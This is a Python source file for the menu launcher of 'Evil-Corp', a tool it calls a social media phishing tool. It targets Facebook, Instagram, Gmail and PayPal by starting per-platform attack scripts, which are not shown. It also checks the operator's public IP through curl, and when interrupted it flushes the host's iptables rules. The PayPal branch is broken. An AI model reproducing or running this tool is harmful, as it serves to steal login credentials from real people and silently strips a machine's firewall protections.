import os
import sys
import time
import subprocess
import pwd

os.system("clear")

def banner():
     icon = r'''
     ______
    / ____/
   / __/    Evil-Corp (v1)
  / /___    Developed by : J0hnn13 W4lk3r
 /_____/    Social Media Phishing Tool

    '''
     print(icon)
     tool_main_function()

def tool_main_function():
         try:
             menu =input("evilcorp >> ")
             if menu =="":
                 tool_main_function()
             elif menu =="platform list":
                    platforms()
             elif menu =="clear":
                    os.system("clear")
                    banner()
             elif menu =="select platform facebook":
                    os.system("cd sites/facebook && python3 main.py")
             elif menu =="select platform instagram":
                    os.system("cd sites/instagram && python3 main.py")
             elif menu =="select platform google":
                    os.system("cd sites/google && python3 main.py")
             elif menu =="select platform paypal":
                    os.system("python3 sites/paypal && python3 main.py")
             elif menu =="check ip":
                    print ("")
                    os.system("curl ifconfig.me")
                    print ("")
                    tool_main_function()
             elif menu =="help":
                    help_menu()
             else:
                 print ("[!] Command Not Found")
                 tool_main_function()

         except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            os.system("iptables -F")
            os.system("iptables -t nat -F")
            sys.exit(0)

def platforms():
       print ("\nAvailable Phishing Platform")
       print ("\n[+] Facebook\n[+] Instagram\n[+] Gmail\n[+] Paypal\n")
       tool_main_function()

def help_menu():
        print ("\nAvailable Commands")
        print ("\nplatform list - List All Available Platform\nselect platform - To Select Platform And To Start The Attack\nclear - To Clear Screen\ncheck ip - To Check IP If It Is Proxied")
        platforms()
        tool_main_function()

if __name__ == "__main__":
   banner()
